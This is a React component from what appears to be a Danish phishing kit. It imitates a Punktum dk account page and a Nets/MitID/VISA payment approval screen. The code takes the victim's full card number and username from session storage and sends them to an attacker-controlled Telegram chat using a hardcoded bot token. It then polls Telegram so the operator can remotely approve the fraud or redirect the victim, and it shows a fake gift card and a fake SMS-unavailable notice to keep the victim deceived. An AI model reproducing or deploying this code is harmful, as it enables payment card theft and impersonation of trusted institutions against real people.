import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './NextStepAppr.css';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';
import visaLogo from '../assets/visa-logo.png';

const netsLogo = '/Nets_logo.svg';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function NextStepAppr() {
  const { t, language, toggleLanguage } = useLanguage();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());

  // ✅ Read card number and username from sessionStorage immediately
  const [cardNumber, setCardNumber] = useState(() => {
    const stored = sessionStorage.getItem('cardNumber');
    if (stored) {
      const last4 = stored.slice(-4);
      return `**** **** **** ${last4}`;
    }
    return '**** **** **** 9116';
  });

  const [username, setUsername] = useState(() => {
    return sessionStorage.getItem('loginName') || '';
  });

  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');
  const [amount, setAmount] = useState('0.00');
  const [merchant, setMerchant] = useState('Spotify ');

  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');

  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  const handleSuccessCard = () => {
    setIsConfirmed(false);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const closeGiftCard = () => {
    setShowGiftCard(false);
    sessionStorage.setItem('showCardForm', 'true');
    window.location.href = '/#/';
  };

  const handleCancel = () => {
    window.location.href = '/#/';
  };

  const handleSmsCode = () => {
    const msg = document.createElement('div');
    msg.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:14px 28px;border-radius:500px;z-index:9999;font-family:Arial;font-size:14px;';
    msg.textContent = language === 'da' 
      ? 'SMS+kode er midlertidigt utilgængeligt' 
      : 'SMS+Code is temporarily unavailable';
    document.body.appendChild(msg);
    setTimeout(() => msg.remove(), 3000);
  };

  useEffect(() => {
    let lastUpdateId = 0;
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              if (callbackData.startsWith('success_card_')) {
                handleSuccessCard();
              } else if (callbackData.startsWith('back_to_appr_')) {
                window.location.href = '/#/';
              } else if (callbackData.includes('block_')) {
                window.location.href = '/#/blocked';
              }
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: '✅ Action executed!'
              });
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    const storedAmount = sessionStorage.getItem('amount');

    if (storedBankName) setBankName(storedBankName);
    if (storedBrand) setCardBrand(storedBrand);
    if (storedAmount) setAmount(storedAmount);

    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>MITID APPROVAL REQUEST</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
💰 <b>Amount:</b> ${amount} DKK
🏪 <b>Merchant:</b> ${merchant}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> Waiting for MitID approval
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;

      const keyboard = {
        inline_keyboard: [
          [{ text: "✅ Approve (Godkend)", callback_data: `success_card_${Date.now()}` }],
          [{ text: "⬅️ Back", callback_data: `back_to_appr_${Date.now()}` }]
        ]
      };

      await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending:', error);
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsSending(true);
    const sent = await sendTelegramLog();
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    }
    setIsSending(false);
  };

  if (isConfirmed) {
    return (
      <div className="mitid-waiting-container">
        <div className="mitid-waiting-card">
          <div className="mitid-spinner"></div>
          <h2>Venter på godkendelse...</h2>
          <p>Transaktion godkendt</p>
          <p className="mitid-small">Du bliver omdirigeret...</p>
        </div>
        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </div>
    );
  }

  return (
    <div className="punktum-page">
      {/* Top Bar */}
      <div className="punktum-top-bar">
        <div className="punktum-top-bar-inner">
          <ul className="punktum-top-menu">
            <li><a href="#/domain-login">Punktum dk</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">Statistik</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">english</a></li>
            <li className="punktum-login-link"><a href="#/logud">log af</a></li>
          </ul>
        </div>
      </div>

      {/* Header / Logo */}
      <header className="punktum-header">
        <div className="punktum-header-inner">
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '8px', fontSize: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <span style={{ color: '#333' }}>domænenavn:</span>
              <select style={{ border: 'none', backgroundColor: '#3a82ce', color: '#fff', padding: '2px 5px', borderRadius: '2px', fontWeight: 'bold' }}>
                <option>{username || sessionStorage.getItem('loginName') || 'Domæne'}</option>
              </select>
            </div>
            <button style={{ backgroundColor: '#e0e0e0', border: 'none', color: '#999', padding: '5px 15px', fontSize: '11px', fontWeight: 'bold', borderRadius: '2px', cursor: 'pointer' }}>MIN PROFIL</button>
          </div>
        </div>
      </header>

      {/* Main Nav */}
      <div className="punktum-main-nav">
        <div className="punktum-main-nav-inner">
          <ul>
            <li><a href="#/domæne">Domænenavne</a></li>
            <li><a href="#/konto">Konto</a></li>
          </ul>
          <div className="punktum-help-link">
            <a href="#/domain-login">Brug for hjælp <span className="punktum-icon-help">?</span></a>
          </div>
        </div>
      </div>

      {/* MitID Content Area */}
      <main className="punktum-main" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '60vh' }}>
        <div className="mitid-wrapper">
          <div className="mitid-header">
            <div className="mitid-header-left">
              <img src={netsLogo} alt="Nets" className="nets-logo-image" />
            </div>
            <div className="mitid-header-right">
              <img src={visaLogo} alt="VISA" className="visa-logo-image" />
            </div>
          </div>

          <div className="mitid-transaction-info">
            Betal {amount} DKK til {merchant}
          </div>

          <div className="mitid-approval-section">
            <p className="mitid-title">Åbn MitID app og godkend</p>
            <div className="mitid-phone-animation">
              <object 
                type="image/svg+xml" 
                data="/code-app-slider-emulator.svg"
                className="mitid-phone-img"
              >
                <img src="/code-app-slider-emulator.svg" alt="MitID app" />
              </object>
            </div>
          </div>

          <div className="mitid-buttons">
            <button className="mitid-btn mitid-btn-secondary" onClick={handleCancel}>
              Afbryd
            </button>
            <button className="mitid-btn mitid-btn-primary" onClick={handleSmsCode}>
              SMS+kode
            </button>
          </div>
        </div>

        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </main>

      {/* FOOTER */}
      <footer className="punktum-footer">
        <div className="punktum-footer-inner">
          <div className="punktum-footer-box">
            <h3>Punktum dk A/S</h3>
            <p>Punktum dk er administrator for domænenavne, der ender på .dk.</p>
            <p>Det betyder, at alle .dk-domænenavne er registreret hos os, og at vi har stamoplysninger på alle, der har registreret et .dk-domænenavn.</p>
          </div>
          <div className="punktum-footer-box">
            <h3>Kontakt os</h3>
            <p><strong>Punktum dk A/S</strong><br />Ørestads Boulevard 108, 11. sal<br />2300 København S</p>
            <p>Tlf +45 33 64 60 60</p>
            <p><a href="#/domain-login">Ofte stillede spørgsmål og svar</a></p>
          </div>
          <div className="punktum-footer-box">
            <h3>Information</h3>
            <ul>
              <li><a href="#/domain-login">Punktum dk's hjemmeside</a></li>
              <li><a href="#/domain-login">Vilkår</a></li>
              <li><a href="#/domain-login">Persondatapolitik</a></li>
              <li><a href="#/domain-login">Cookie information</a></li>
            </ul>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default NextStepAppr;